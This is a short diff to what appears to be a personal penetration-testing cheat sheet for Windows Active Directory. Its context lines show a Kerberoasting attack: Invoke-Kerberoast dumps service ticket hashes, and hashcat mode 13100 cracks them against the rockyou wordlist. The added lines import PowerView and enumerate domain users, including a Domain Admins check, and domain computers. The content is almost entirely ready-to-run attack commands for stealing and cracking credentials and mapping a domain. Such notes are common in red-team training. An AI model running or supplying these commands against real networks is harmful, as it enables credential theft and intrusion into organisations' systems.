@@ -28,3 +28,13 @@ Invoke-Kerberoast -OutputFormat Hashcat > hashcat.txt
 # transfer to attack machine for hashcat
 hashcat -m 13100 hash.txt rockyou.txt 
 hashcat -m 13100 hash.txt rockyou.txt --show
+
+# import powerview
+. .\Powerview.ps1
+
+# see what user is a member of (Domain Admins)
+Get-DomainUser -SamAccountName hadams
+
+# Return all computers or specific computer objects in AD.
+Get-DomainComputer
+
